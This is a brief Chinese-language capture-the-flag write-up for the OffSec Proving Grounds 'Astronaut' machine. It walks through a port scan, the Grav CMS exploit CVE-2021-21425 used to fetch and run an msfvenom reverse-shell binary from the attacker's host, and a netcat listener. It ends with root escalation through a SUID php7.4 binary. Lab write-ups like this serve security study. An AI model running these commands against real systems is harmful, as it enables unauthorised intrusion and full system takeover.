###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# Astronaut
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.237.12 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.237.12:22
Open 192.168.237.12:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

google找到這個[CVE-2021-21425
](https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py)，直接下載reverseshell，測試可成功
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.209 LPORT=9001 -f elf > shell_9001

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 exploit.py -c "wget 192.168.45.209/shell_9001" -t http://192.168.237.12/grav-admin

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 exploit.py -c "chmod +x shell_9001; ./shell_9001" -t http://192.168.237.12/grav-admin
```

開nc等反彈，列出binaries，有一個`/usr/bin/php7.4`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@gravity:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.4
/usr/bin/gpasswd
```

查[GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid)，成功後在`/root`路徑可拿到proof.txt
```
www-data@gravity:/var/www/html/grav-admin$ install -m =xs $(which php7.4) .
www-data@gravity:/var/www/html/grav-admin$ CMD="/bin/sh"
www-data@gravity:/var/www/html/grav-admin$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"

# whoami
root

# cat proof.txt
980b63f9f918641e61c0ebb60486f038
```